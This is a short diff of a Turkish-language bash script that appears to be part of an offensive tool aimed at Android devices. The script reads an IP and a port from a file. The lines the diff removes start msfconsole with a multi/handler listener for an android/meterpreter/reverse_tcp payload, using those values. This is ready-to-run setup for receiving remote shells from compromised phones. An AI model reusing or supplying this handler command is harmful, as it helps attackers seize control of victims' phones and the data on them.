@@ -23,20 +23,8 @@ echo
 sleep 0.5
 if [[ -a ağ.txt ]];then
 	ip=$(sed -n 1p ağ.txt)
-	kontrol=$(sed -n 2p ağ.txt |wc -m)
-	if [[ $kontrol == 1 ]];then
-		echo
-		echo
-		echo
-		printf "\e[33m[*]\e[97m MSFCONSOLE AÇILIYOR.."
-		echo
-		echo
-		echo
-		sleep 0.5
-		port=$(sed -n 3p ağ.txt)
-		msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $port; exploit;"
-		exit
-	else
+	kontrol=$(cat ağ.txt |wc -m)
+	if [[ $kontrol -gt 1 ]];then
 		echo
 		echo
 		echo
